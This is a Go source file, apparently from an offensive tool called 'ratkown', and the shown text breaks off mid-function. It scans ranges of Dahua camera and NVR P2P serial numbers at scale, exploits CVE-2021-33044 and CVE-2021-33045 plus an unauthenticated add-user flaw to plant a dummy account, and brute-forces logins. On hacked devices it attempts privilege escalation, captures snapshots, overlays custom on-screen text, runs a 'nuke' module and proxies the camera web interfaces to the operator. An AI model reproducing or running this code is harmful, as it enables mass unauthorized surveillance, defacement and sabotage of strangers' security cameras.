package scan

import (
	"fmt"
	"github.com/fatih/color"
	"math"
	"os"
	"os/signal"
	"path/filepath"
	"ratkown/ratkown/config"
	"ratkown/ratkown/dhip"
	"ratkown/ratkown/exploit"
	"ratkown/ratkown/net"
	"ratkown/ratkown/nuke"
	"ratkown/ratkown/osd"
	"ratkown/ratkown/types"
	"ratkown/ratkown/ui"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	scanRed   = color.New(color.FgHiRed)
	scanGreen = color.New(color.FgGreen)
)

type Scanner struct {
	Targets      []string
	Config       *types.Config
	Threads      int
	OutDir       string
	InputSource  string
	NukeArmed    bool
	UnmaskFirst  bool
	ForceosdMode bool

	TotalCount     int64
	CompletedCount int64
	PwnedCount     int64
	OnlineCount    int64
	AliveVerdicts  int64
	SafeCount      int64
	WasteCount     int64

	unitSnap   int64
	unitExtra  int64
	unitTotal  int64
	totalUnits int64
	doneUnits  int64

	startTime     time.Time
	lastSample    time.Time
	lastCompleted int64
	lastRate      int64

	mu            sync.Mutex
	wg            sync.WaitGroup
	snapshotWg    sync.WaitGroup
	cancelOnce    sync.Once
	pwnedList     []types.ExploitResult
	cancelChan    chan struct{}
	provided      map[string]types.ProvidedCred
	WebProxy      bool
	DashboardPort int
	webMu         sync.Mutex
	webProxies    []webProx
}

func NewScanner(targets []string, config *types.Config, threads int, outDir string, inputSource string, nukeArmed bool, provided []types.ProvidedCred) *Scanner {
	creds := make(map[string]types.ProvidedCred, len(provided))
	for _, c := range provided {
		creds[c.Serial] = c
	}
	return &Scanner{
		Targets:     targets,
		Config:      config,
		Threads:     threads,
		OutDir:      outDir,
		InputSource: inputSource,
		NukeArmed:   nukeArmed,
		cancelChan:  make(chan struct{}),
		provided:    creds,
	}
}

func (s *Scanner) connectTimeout() time.Duration {
	timeoutMs := 5000
	if val, err := types.GetIntValue(s.Config.Scan.Timeout); err == nil && val > 0 {
		timeoutMs = val
	}
	return time.Duration(timeoutMs) * time.Millisecond
}

func (s *Scanner) maxRPS() int {
	if val, err := types.GetIntValue(s.Config.Scan.MaxRPS); err == nil && val > 0 {
		return val
	}
	return 0
}

func (s *Scanner) governorOn() bool {
	if s.Config.Scan.Governor == nil {
		return true
	}
	if val, err := types.GetBoolValue(s.Config.Scan.Governor); err == nil {
		return val
	}
	return true
}

func isPrefix(target string) bool {
	return len(target) == 10
}

func (s *Scanner) Run() {
	ui.TUIInit()
	if s.DashboardPort > 0 {
		ui.TUIThread(fmt.Sprintf("[web] dashboard at http://127.0.0.1:%d", s.DashboardPort))
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		s.cancelOnce.Do(func() { close(s.cancelChan) })

		ui.TUIShutdown()

		nowStr := time.Now().Format("15:04:05")
		fmt.Printf("\r\n")
		scanRed.Printf("[%s] Interrupted\n", nowStr)

		os.Exit(0)
	}()

	ranges, err := config.ParseGenerateRanges(s.Config.Scan.Generate)
	if err != nil {
		ranges = []types.Range{{0, 1048576}}
	}

	retries := 3
	if val, err := types.GetIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	connTimeout := s.connectTimeout()

	nurses := 20
	if val, err := types.GetIntValue(s.Config.Scan.Nurses); err == nil {
		nurses = val
	}

	var total int64 = 0
	for _, target := range s.Targets {
		if isPrefix(target) {
			for _, r := range ranges {
				total += int64(r.End - r.Start)
			}
		} else {
			total++
		}
	}
	s.TotalCount = total

	s.unitSnap = 0
	if s.Config.Image.Snapshot {
		s.unitSnap = 1
	}
	s.unitExtra = 0
	osdPossible := s.Config.Overlay.Osd && (osd.NormalizeOSDChannel(s.Config.Overlay.Channel) != "" || len(osd.NormalizeOSDLines(s.Config.Overlay.Custom)) > 0)
	picPossible := s.Config.Overlay.Picture && s.Config.Overlay.PictureFile != ""
	if osdPossible || picPossible || (s.NukeArmed && s.Config.Nuke.Enabled()) {
		s.unitExtra = 1
	}
	s.unitTotal = 1 + s.unitSnap + s.unitExtra
	s.totalUnits = total * s.unitTotal

	nowStr := time.Now().Format("15:04:05")
	if ui.TUIActive() {
		ui.TUISetupHeader(ui.RandomMOTD(), s.Config.Path, s.Threads, s.OutDir)
	} else {
		ui.PrintBanner(nowStr)
		fmt.Printf("[input] > %s\n", s.InputSource)
		fmt.Printf("[count] > %d\n", s.TotalCount)
		fmt.Printf("[output] > %s\n", s.OutDir)
		fmt.Printf("[threads] > %d\n", s.Threads)
		fmt.Printf("[config] > %s\n\n", s.Config.Path)
	}

	ui.LogScanStart(s.InputSource, s.TotalCount, s.Threads, s.Config.Path, s.OutDir)
	os.MkdirAll(s.OutDir, 0755)
	s.writePwnedStart()

	onlineChan := make(chan string, s.Threads*2)

	s.startTime = time.Now()
	s.lastSample = s.startTime

	go func() {
		ticker := time.NewTicker(200 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-s.cancelChan:
				return
			case <-ticker.C:
				s.printProgress()
			}
		}
	}()

	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			for serial := range onlineChan {
				func() {
					defer func() {
						if r := recover(); r != nil {
							ui.DebugLogf("worker", "online worker panic %v serial %s skipped", r, serial)
							s.mu.Lock()
							s.CompletedCount++
							s.mu.Unlock()
						}
					}()
					select {
					case <-s.cancelChan:
						return
					default:
					}
					s.handleOnlineSerial(serial, retries, connTimeout)
				}()
			}
		}()
	}

	pipe, err := net.NewCheckPipe(nurses, s.cancelChan, s.maxRPS(), s.governorOn())
	if err != nil {
		scanRed.Printf("[!] %s\n", err)
		return
	}
	jobs := pipe.Jobs()

	var verdictWg sync.WaitGroup
	verdictWg.Add(1)
	go func() {
		defer verdictWg.Done()
		for v := range pipe.Verdicts() {
			if v.Alive {
				ui.LogOnlineFound(v.Serial)
				s.mu.Lock()
				s.AliveVerdicts++
				s.doneUnits++
				s.mu.Unlock()
				ui.TUIEventFound(v.Serial)
				select {
				case onlineChan <- v.Serial:
				case <-s.cancelChan:
					return
				}
			} else {
				s.mu.Lock()
				s.WasteCount++
				s.CompletedCount++
				s.doneUnits += s.unitTotal
				s.mu.Unlock()
				ui.TUIEventWaste(v.Serial)
			}
		}
	}()

	for _, target := range s.Targets {
		if !isPrefix(target) {
			select {
			case <-s.cancelChan:
				goto cleanup
			default:
			}
			jobs <- target
		} else {
			for _, r := range ranges {
				for i := r.Start; i < r.End; i++ {
					select {
					case <-s.cancelChan:
						goto cleanup
					default:
					}
					suffix := fmt.Sprintf("%05X", i)
					jobs <- target + suffix
				}
			}
		}
	}

cleanup:
	pipe.Close()
	verdictWg.Wait()
	close(onlineChan)
	s.wg.Wait()
	s.snapshotWg.Wait()
	s.cancelOnce.Do(func() { close(s.cancelChan) })
	s.printProgress()
	if ui.TUIActive() {
		ui.TUIStats(s.doneUnits, s.totalUnits, s.AliveVerdicts, s.OnlineCount, s.WasteCount, s.PwnedCount, s.lastRate, s.CompletedCount, time.Since(s.startTime))
		ui.TUIShutdown()
	}
	fmt.Println()

	ui.LogScanFinish(s.CompletedCount, s.PwnedCount, s.OnlineCount, s.WasteCount, s.TotalCount)
	doneTimeStr := time.Now().Format("15:04:05")
	scanGreen.Printf("[%s] Done\n", doneTimeStr)

	s.webMu.Lock()
	proxies := make([]webProx, len(s.webProxies))
	copy(proxies, s.webProxies)
	s.webMu.Unlock()
	if s.DashboardPort > 0 {
		nc := WebCamCount()
		plural := "s"
		if nc == 1 {
			plural = ""
		}
		fmt.Println()
		scanGreen.Printf("[web] http://127.0.0.1:%d (%d cam%s)\n", s.DashboardPort, nc, plural)
		select {}
	}
	if len(proxies) > 0 {
		fmt.Println()
		scanGreen.Printf("[web] %d live web sessions (Ctrl+C closes all):\n", len(proxies))
		for _, p := range proxies {
			fmt.Printf("  http://127.0.0.1:%d -> %s\n", p.port, p.serial)
		}
		select {}
	}
}

func tryType0Tunnel(serial string, retries int, timeout time.Duration) *net.DHClient {
	client := net.NewDHClient(serial)
	client.SetRetries(retries)
	if timeout > 0 {
		client.SetTimeout(timeout)
	}
	if err := client.Handshake(); err != nil {
		client.Close()
		return nil
	}
	if err := client.EstablishDirectP2P(); err != nil {
		if err = client.CompleteRelayHandshake(); err != nil {
			client.Close()
			return nil
		}
	}
	return client
}

func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout time.Duration) {
	var ok bool
	var finalClient *net.DHClient
	var requiresType1 bool

	if hint, has := s.credHint(serial); has {
		if c := s.handshakeWithCreds(serial, hint, retries, connTimeout); c != nil {
			finalClient = c
			ok = true
			ui.LogHandshakeResult(serial, 1, 0, nil)
			s.mu.Lock()
			s.OnlineCount++
			s.mu.Unlock()
			s.processOnlineClient(serial, finalClient)
			return
		}
	}

	var lastErr error
	for attempt := 0; attempt < retries; attempt++ {
		select {
		case <-s.cancelChan:
			return
		default:
		}
		client := net.NewDHClient(serial)
		client.SetRetries(retries)
		client.SetTimeout(connTimeout)
		err := client.Handshake()
		lastErr = err
		if err == nil {
			finalClient = client
			ok = true
			break
		}
		client.Close()
		if net.IsChannelAuthRequired(err) {
			requiresType1 = true
			ui.LogType1ChannelAuthRequired(serial)
			break
		}
	}

	if !ok && !requiresType1 && lastErr != nil {
		if strings.Contains(lastErr.Error(), "timeout") || strings.Contains(lastErr.Error(), "no response") {
			requiresType1 = true
			ui.LogType1TimeoutAssume(serial, lastErr)
		}
	}

	if !ok && requiresType1 {
		ui.LogType1Start(serial)
		if probe := tryType0Tunnel(serial, retries, connTimeout); probe != nil {
			finalClient = probe
			ok = true
			ui.LogType1TunnelSuccess(serial)
		} else {
			if !s.Config.Pwn.Protocol["type1"] {
				ui.LogType1Skipped(serial)
				s.mu.Lock()
				s.OnlineCount++
				s.CompletedCount++
				s.doneUnits += s.unitTotal - 1
				s.mu.Unlock()
				return
			}

			if s.Config.Pwn.Methods["brute"] && len(s.Config.Brute.Creds) > 0 {
				type1Delay := 0
				if val, err := types.GetIntValue(s.Config.Brute.Type1.Delay); err == nil && val > 0 {
					type1Delay = val
				}
				for idx, cred := range s.Config.Brute.Creds {
					if until := net.DeviceLockedUntil(serial); !until.IsZero() {
						ui.LogCredsLocked(serial, until)
						break
					}
					if type1Delay > 0 && idx > 0 {
						select {
						case <-s.cancelChan:
							return
						case <-time.After(time.Duration(type1Delay) * time.Second):
						}
					}
					select {
					case <-s.cancelChan:
						return
					default:
					}
					authClient := net.NewDHClient(serial)
					authClient.SetRetries(retries)
					authClient.SetTimeout(connTimeout)
					authClient.SetDeviceAuth(cred.Login, cred.Password, "")
					authErr := authClient.Handshake()
					if authErr == nil {
						finalClient = authClient
						ok = true
						ui.LogType1Brute(serial, cred.Login, cred.Password, idx+1, nil)
						break
					}
					ui.LogType1Brute(serial, cred.Login, cred.Password, idx+1, authErr)
					authClient.Close()
				}
			}
		}
	}

	if ok && finalClient != nil {
		ui.LogHandshakeResult(serial, 0, 0, nil)
		s.mu.Lock()
		s.OnlineCount++
		s.mu.Unlock()
		s.processOnlineClient(serial, finalClient)
	} else {
		ui.LogHandshakeResult(serial, 0, 0, lastErr)
		s.mu.Lock()
		s.WasteCount++
		s.CompletedCount++
		s.doneUnits += s.unitTotal - 1
		s.mu.Unlock()
		ui.TUIEventWaste(serial)
	}
}

func (s *Scanner) credHint(serial string) (types.ProvidedCred, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	c, ok := s.provided[serial]
	return c, ok
}

func (s *Scanner) handshakeWithCreds(serial string, cred types.ProvidedCred, retries int, connTimeout time.Duration) *net.DHClient {
	build := func(auth bool) *net.DHClient {
		c := net.NewDHClient(serial)
		c.SetRetries(retries)
		c.SetTimeout(connTimeout)
		if auth {
			c.SetDeviceAuth(cred.Login, cred.Password, "")
		}
		return c
	}
	for _, auth := range []bool{true, false} {
		for attempt := 0; attempt < retries; attempt++ {
			select {
			case <-s.cancelChan:
				return nil
			default:
			}
			client := build(auth)
			err := client.Handshake()
			if err == nil {
				ui.LogCredsLogin(serial, cred.Login, auth)
				return client
			}
			client.Close()
			ui.LogCredsFail(serial, cred.Login, auth, attempt+1, err)
			if !auth && net.IsChannelAuthRequired(err) {
				break
			}
		}
	}
	return nil
}

func (s *Scanner) processOnlineClient(serial string, client *net.DHClient) {
	retries := 3
	if val, err := types.GetIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}

	for attempt := 0; attempt < retries; attempt++ {
		directOK := !net.Socks5Enabled()
		err := client.EstablishDirectP2P()
		if err != nil {
			directOK = false
			err = client.CompleteRelayHandshake()
		}
		ui.LogTunnelEstablishResult(serial, attempt, directOK, err)
		if err != nil {
			continue
		}

		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)

		var tunnel *net.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}

		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}

		if hint, has := s.credHint(serial); has {
			s.useProvidedCreds(serial, client, tunnel, directOK, hint, cleanup)
			return
		}

		pwned := s.processExploit(serial, client, tunnel, directOK, cleanup)
		if !pwned {
			go cleanup()
		}
		return
	}

	client.Close()
	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.doneUnits += s.unitTotal - 1
	s.mu.Unlock()
}

func (s *Scanner) useProvidedCreds(serial string, client *net.DHClient, tunnel *net.PTCPTunnel, directOK bool, cred types.ProvidedCred, cleanup func()) {
	if until, locked := s.deviceLocked(serial); locked {
		ui.LogCredsLocked(serial, until)
		s.mu.Lock()
		s.SafeCount++
		s.CompletedCount++
		s.doneUnits += s.unitTotal - 1
		s.mu.Unlock()
		go cleanup()
		return
	}
	if !s.verifyInputCreds(serial, tunnel, cred.Login, cred.Password) {
		s.mu.Lock()
		s.SafeCount++
		s.CompletedCount++
		s.doneUnits += s.unitTotal - 1
		s.mu.Unlock()
		go cleanup()
		return
	}
	ip := ""
	if addr := client.GetDeviceAddr(); addr != "" {
		if i := strings.Index(addr, ":"); i > 0 {
			ip = addr[:i]
		} else {
			ip = addr
		}
	}

	tunnel.SetAuth(cred.Login, cred.Password)
	model, channels, _, err := tunnel.GetDeviceInfo()
	if err != nil || model == "" {
		sdk := net.NewSDKClient(tunnel, cred.Login, cred.Password)
		if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
			if m != "" {
				model = m
			}
			if ch > 0 {
				channels = ch
			}
		}
	}
	if model == "" {
		model = "Dahua Device"
	}
	if channels <= 0 {
		channels = 1
	}

	res := &types.ExploitResult{
		Method:   "creds",
		Login:    cred.Login,
		Password: cred.Password,
		Model:    model,
		Channels: channels,
		IP:       ip,
	}
	s.handlePwnedResult(serial, ip, res, tunnel, func(*types.ExploitResult) (*net.PTCPTunnel, bool) {
		return tunnel, false
	}, cleanup)
}

func (s *Scanner) deviceLocked(serial string) (time.Time, bool) {
	until := net.DeviceLockedUntil(serial)
	if until.IsZero() {
		return time.Time{}, false
	}
	return until, true
}

func (s *Scanner) verifyInputCreds(serial string, tunnel *net.PTCPTunnel, login, pass string) bool {
	dh, err := tunnel.NewDHIPClientOnPort(5000)
	if err == nil {
		verr := dh.LoginNormal(login, pass)
		dh.Close()
		if verr == nil {
			return true
		}
		ui.LogCredsVerify(serial, login, "dhip", verr)
	}
	if until, locked := s.deviceLocked(serial); locked {
		ui.LogCredsLocked(serial, until)
		return false
	}
	sess, serr := dhip.NewRPC2Session(tunnel, login, pass)
	if serr == nil && sess != nil {
		sess.Close()
		return true
	}
	ui.LogCredsVerify(serial, login, "rpc2", serr)
	return false
}

func (s *Scanner) handlePwnedResult(serial, ip string, res *types.ExploitResult, tunnel *net.PTCPTunnel, reopen func(*types.ExploitResult) (*net.PTCPTunnel, bool), cleanup func()) {
	activeTunnel, fresh := reopen(res)
	res.IP = ip
	s.handlePwned(serial, res)

	osdCleanup := cleanup
	if fresh {
		osdCleanup = func() {
			if activeTunnel != nil {
				activeTunnel.Disconnect()
			}
			cleanup()
		}
	}

	if s.WebProxy && activeTunnel != nil && res != nil && res.Login != "" && res.Password != "" {
		port, stop, werr := startWebProxy(activeTunnel, serial, res.Login, res.Password, s.OutDir)
		if werr == nil {
			s.addWebProxy(serial, port, stop)
			if s.DashboardPort > 0 {
				WebCamSetProxy(serial, port)
			}
			ui.DebugLogf("web", "%s > local web proxy on 127.0.0.1:%d", serial, port)
			osdCleanup = func() {}
		} else {
			ui.DebugLogf("web", "%s > proxy failed: %v", serial, werr)
		}
	}

	if s.UnmaskFirst && s.NukeArmed && s.Config.Nuke.Box && len(s.Config.Nuke.BoxRects) == 0 {
		nuke.RunNuke(activeTunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, true)
	}

	if res != nil && res.Login != "" && res.Password != "" {
		s.tryPrivesc(activeTunnel, serial, res)
	}

	if res != nil && res.Login != "" && res.Password != "" {
		ns, err := nuke.NewNukeSession(activeTunnel, res.Login, res.Password)
		if err == nil && exploit.CheckAdminAccess(ns) {
			ns.Closer()
			s.runAntiWhiteSweep(activeTunnel, serial, res)
		} else {
			if ns != nil {
				ns.Closer()
			}
			ui.DebugLogf("antinuke", "%s > skipped: not admin (VTO)", serial)
		}
	}

	s.applyOSDBeforeShot(activeTunnel, serial, res)

	if s.ForceosdMode {
		s.runFortify(activeTunnel, serial, res)
	}

	if types.IsNVRModel(res.Model) && res.Channels > 1 && res.Login != "" && res.Password != "" {
		NVRHopFull(activeTunnel, serial, res.Login, res.Password, res.Model, res.Channels, s.OutDir, s.Config.Image)
	}

	if s.Config.Image.Snapshot && res != nil && res.Channels > 0 && res.Login != "" && res.Password != "" {
		captured := false
		for attempt := 0; attempt < 3; attempt++ {
			ok, snapErr := exploit.CaptureSnapshot(activeTunnel, res.Method, res.Login, res.Password, res.Channels, s.OutDir, serial, res.Model, s.Config.Image)
			if ok {
				captured = true
				break
			}
			if snapErr == nil || !osd.IsConnBreakErr(snapErr) || attempt == 2 {
				break
			}
			if nt, _, ok := s.dialFreshTunnel(serial, res); ok && nt != nil {
				if activeTunnel != nil {
					activeTunnel.Disconnect()
				}
				activeTunnel = nt
			}
		}
		if !captured {
			if !s.launchSnapshot(serial, res) {
				s.mu.Lock()
				s.CompletedCount++
				s.doneUnits += s.unitSnap
				s.mu.Unlock()
			}
			s.launchExtras(serial, activeTunnel, res, osdCleanup)
			return
		}
	}

	s.mu.Lock()
	s.CompletedCount++
	s.doneUnits += s.unitSnap
	s.mu.Unlock()

	s.launchExtras(serial, activeTunnel, res, osdCleanup)
}

func stagePwned(stage string, res *types.ExploitResult, err error) bool {
	if err != nil || res == nil {
		return false
	}
	if stage == "cve-2021-33044" || stage == "cve-2021-33045" {
		return res.Password != ""
	}
	return true
}

func (s *Scanner) processExploit(serial string, client *net.DHClient, tunnel *net.PTCPTunnel, directOK bool, cleanup func()) bool {
	reopenTunnelFor := func(res *types.ExploitResult) (*net.PTCPTunnel, bool) {
		if res == nil || (res.Method != "cve-2021-33044" && res.Method != "cve-2021-33045") || res.Login == "" || res.Password == "" {
			return tunnel, false
		}
		tunnel.Disconnect()

		var fresh *net.PTCPTunnel
		if directOK {
			fresh = client.NewDirectTunnel()
		} else {
			fresh = client.NewTunnel()
		}
		fresh.SetAuth(res.Login, res.Password)
		if model, channels, _, err := fresh.GetDeviceInfo(); err == nil && model != "" {
			res.Model = model
			res.Channels = channels
			return fresh, true
		}
		sdk := net.NewSDKClient(fresh, res.Login, res.Password)
		if _, model, channels, err := sdk.GetDeviceInfo(); err == nil {
			if model != "" {
				res.Model = model
			}
			if channels > 0 {
				res.Channels = channels
			}
		}
		return fresh, true
	}

	ip := ""
	remoteAddr := client.GetDeviceAddr()
	if remoteAddr != "" {
		if idx := strings.Index(remoteAddr, ":"); idx > 0 {
			ip = remoteAddr[:idx]
		} else {
			ip = remoteAddr
		}
	}

	ui.LogExploitStart(serial, ip)

	if client.IsPwnedAuth() {
		user, pass, _, _ := client.GetDeviceAuth()
		tunnel.SetAuth(user, pass)

		model, channels, _, err := tunnel.GetDeviceInfo()
		if err != nil || model == "" {
			sdk := net.NewSDKClient(tunnel, user, pass)
			if _, m, ch, sErr := sdk.GetDeviceInfo(); sErr == nil {
				if m != "" {
					model = m
				}
				if ch > 0 {
					channels = ch
				}
			}
		}
		if model == "" {
			model = "Dahua Device"
		}
		if channels == 0 {
			channels = 1
		}
		res := &types.ExploitResult{
			Method:   "type1",
			Login:    user,
			Password: pass,
			Model:    model,
			Channels: channels,
			IP:       ip,
		}
		s.handlePwned(serial, res)
		if !s.launchSnapshot(serial, res) {
			s.mu.Lock()
			s.CompletedCount++
			s.doneUnits += s.unitSnap
			s.mu.Unlock()
		}
		s.launchExtras(serial, tunnel, res, cleanup)
		return true
	}

	finishStage := func(stage string, res *types.ExploitResult, err error) bool {
		if stagePwned(stage, res, err) {
			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
			return false
		}
		if err != nil {
			ui.LogExploitStageFailed(serial, stage, err)
		}
		return true
	}

	if s.Config.Pwn.Protocol["cgi"] {
		if s.Config.Pwn.Methods["cve-2021-33044"] {
			res, err := exploit.TryCVE2021_33044(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
			if !finishStage("cve-2021-33044", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["cve-2021-33045"] {
			res, err := exploit.TryCVE2021_33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
			if !finishStage("cve-2021-33045", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["uau"] {
			res, err := exploit.TryUnauthAddUser(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo)
			if !finishStage("uau", res, err) {
				return true
			}
		}

		if s.Config.Pwn.Methods["cve-2021-33045"] {
			if addRes, addErr := exploit.TryAddDummy33045(tunnel, s.Config.Dummy.Login, s.Config.Dummy.Password, s.Config.Dummy.Memo); !finishStage("cve-2021-33045-add", addRes, addErr) {
				return true
			}
		}

		if s.Config.Pwn.Methods["brute"] {
			res, err := exploit.TryBruteForceWeb(tunnel, s.Config.Brute.Creds, serial)
			if err == nil && res != nil {
				s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
				return true
			} else if err != nil {
				ui.LogExploitStageFailed(serial, "web-brute", err)
			}
		}
	} else if s.Config.Pwn.Protocol["sdk"] && s.Config.Pwn.Methods["brute"] {
		res, err := exploit.TryBruteForceSDK(tunnel, s.Config.Brute.Creds, serial)
		if err == nil && res != nil {
			s.handlePwnedResult(serial, ip, res, tunnel, reopenTunnelFor, cleanup)
			return true
		} else if err != nil {
			ui.LogExploitStageFailed(serial, "sdk-brute", err)
		}
	}

	ui.LogExploitUnpwned(serial)

	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.doneUnits += s.unitTotal - 1
	s.mu.Unlock()
	return false
}

func (s *Scanner) dialFreshTunnel(serial string, res *types.ExploitResult) (*net.PTCPTunnel, func(), bool) {
	retries := 3
	if val, err := types.GetIntValue(s.Config.Scan.Retries); err == nil {
		retries = val
	}
	connTimeout := s.connectTimeout()
	login, pass := res.Login, res.Password
	isType1 := res.Method == "type1"
	for attempt := 0; attempt < retries; attempt++ {
		client := net.NewDHClient(serial)
		client.SetRetries(retries)
		client.SetTimeout(connTimeout)
		if isType1 {
			client.SetDeviceAuth(login, pass, "")
		}
		if err := client.Handshake(); err != nil {
			client.Close()
			if !isType1 && net.IsChannelAuthRequired(err) && login != "" && pass != "" {
				client = net.NewDHClient(serial)
				client.SetRetries(retries)
				client.SetTimeout(connTimeout)
				client.SetDeviceAuth(login, pass, "")
				if err := client.Handshake(); err != nil {
					client.Close()
					continue
				}
			} else {
				continue
			}
		}
		directOK := !net.Socks5Enabled()
		if err := client.EstablishDirectP2P(); err != nil {
			directOK = false
			if err = client.CompleteRelayHandshake(); err != nil {
				client.Close()
				continue
			}
		}
		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)
		var tunnel *net.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}
		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}
		return tunnel, cleanup, true
	}
	return nil, nil, false
}

func (s *Scanner) launchSnapshot(serial string, res *types.ExploitResult) bool {
	if !s.Config.Image.Snapshot || res == nil || res.Channels <= 0 || res.Login == "" || res.Password == "" {
		return false
	}

	method := res.Method
	login := res.Login
	password := res.Password
	channels := res.Channels
	model := res.Model

	s.snapshotWg.Add(1)
	go func() {
		defer s.snapshotWg.Done()
		defer func() {
			s.mu.Lock()
			s.CompletedCount++
			s.doneUnits += s.unitSnap
			s.mu.Unlock()
		}()
		defer func() {
			if r := recover(); r != nil {
				ui.LogSnapshotResult(serial, "", false, fmt.Errorf("worker panic: %v", r))
			}
		}()

		if until := net.DeviceLockedUntil(serial); !until.IsZero() {
			ui.LogSnapshotResult(serial, "", false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
			return
		}

		retries := 3
		if val, err := types.GetIntValue(s.Config.Scan.Retries); err == nil {
			retries = val
		}
		connTimeout := s.connectTimeout()

		time.Sleep(500 * time.Millisecond)

		deadline := time.Now().Add(60 * time.Second)
		budgetSpent := false

		for attempt := 0; attempt < retries; attempt++ {
			if time.Now().After(deadline) {
				budgetSpent = true
				break
			}
			client := net.NewDHClient(serial)
			client.SetRetries(retries)
			client.SetTimeout(connTimeout)

			isType1 := (method == "type1")
			if isType1 {
				client.SetDeviceAuth(login, password, "")
			}

			if err := client.Handshake(); err != nil {
				client.Close()
				if !isType1 && net.IsChannelAuthRequired(err) && login != "" && password != "" {
					client = net.NewDHClient(serial)
					client.SetRetries(retries)
					client.SetTimeout(connTimeout)
					client.SetDeviceAuth(login, password, "")

					if err := client.Handshake(); err != nil {
						client.Close()
						continue
					}
				} else {
					continue
				}
			}
			directOK := !net.Socks5Enabled()
			if err := client.EstablishDirectP2P(); err != nil {
				directOK = false
				if err = client.CompleteRelayHandshake(); err != nil {
					client.Close()
					continue
				}
			}

			stopHB := make(chan struct{})
			client.StartHeartbeat(stopHB)

			var tunnel *net.PTCPTunnel
			if directOK {
				tunnel = client.NewDirectTunnel()
			} else {
				tunnel = client.NewTunnel()
			}

			snapshotOK := false
			for snapshotAttempt := 0; snapshotAttempt < retries; snapshotAttempt++ {
				if snapshotAttempt > 0 && time.Now().After(deadline) {
					break
				}
				ok, snapErr := exploit.CaptureSnapshot(tunnel, method, login, password, channels, s.OutDir, serial, model, s.Config.Image)
				if ok {
					snapshotOK = true
					break
				}
				if !exploit.SnapshotDeadTunnel(snapErr) {
					break
				}
			}
			if snapshotOK {
				go func(tunnel *net.PTCPTunnel, stopHB chan struct{}, client *net.DHClient) {
					tunnel.Disconnect()
					close(stopHB)
					client.Close()
				}(tunnel, stopHB, client)
				return
			}
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
			continue
		}
		if budgetSpent {
			ui.LogSnapshotResult(serial, "", false, fmt.Errorf("snapshot budget spent"))
		}
	}()
	return true
}

func (s *Scanner) launchExtras(serial string, tunnel *net.PTCPTunnel, res *types.ExploitResult, cleanup func()) {
	if res == nil || res.Login == "" || res.Password == "" {
		if cleanup != nil {
			cleanup()
		}
		return
	}

	nukeOn := s.NukeArmed && s.Config.Nuke.Enabled()
	channel := osd.NormalizeOSDChannel(s.Config.Overlay.Channel)
	lines := osd.NormalizeOSDLines(s.Config.Overlay.Custom)
	osdOn := s.Config.Overlay.Osd && (channel != "" || len(lines) > 0)
	picOn := s.Config.Overlay.Picture && s.Config.Overlay.PictureFile != ""
	ui.DebugLogf("extras", "%s > nukeOn=%v osdOn=%v picOn=%v", serial, nukeOn, osdOn, picOn)

	if osdOn {
		channel = osd.ExpandOSDTemplate(channel, serial, res.Model, "", "")
		for i := range lines {
			lines[i] = osd.ExpandOSDTemplate(lines[i], serial, res.Model, "", "")
		}
	}

	if !nukeOn && !osdOn && !picOn {
		if cleanup != nil {
			cleanup()
		}
		return
	}

	s.snapshotWg.Add(1)
	go func() {
		defer s.snapshotWg.Done()
		defer s.addUnits(s.unitExtra)
		defer func() {
			if r := recover(); r != nil {
				ui.DebugLogf("worker", "extras worker panic %v serial %s skipped", r, serial)
			}
		}()
		if cleanup != nil {
			defer cleanup()
		}
		if until := net.DeviceLockedUntil(serial); !until.IsZero() {
			ui.LogOSDResult(serial, 5000, false, fmt.Errorf("account locked until %s", until.Format("15:04:05")))
			return
		}
		if picOn {
			if perr := osd.TryPictureTitle(tunnel, res.Login, res.Password, s.Config.Overlay.PictureFile, s.OutDir, serial); perr != nil {
				ui.LogOSDResult(serial, 80, false, perr)
			} else {
				ui.LogOSDResult(serial, 80, true, nil)
			}
		}
		if !osdOn {
			if nukeOn {
				nuke.RunNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
			}
			return
		}
		redial := func() (*net.PTCPTunnel, func(), bool) {
			return s.dialFreshTunnel(serial, res)
		}
		err := osd.TryOSD(tunnel, res.Login, res.Password, channel, lines, osd.StyleFromOverlaySerial(s.Config.Overlay, serial), redial)
		if err != nil {
			ui.LogOSDResult(serial, 5000, false, err)
		} else {
			ui.LogOSDResult(serial, 5000, true, nil)
		}
		if nukeOn {
			nuke.RunNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
		}
	}()
}

func (s *Scanner) runAntiWhiteSweep(tunnel *net.PTCPTunnel, serial string, res *types.ExploitResult) {
	if tunnel == nil {
		return
	}
	ns, err := nuke.NewNukeSession(tunnel, res.Login, res.Password)
	if err != nil {
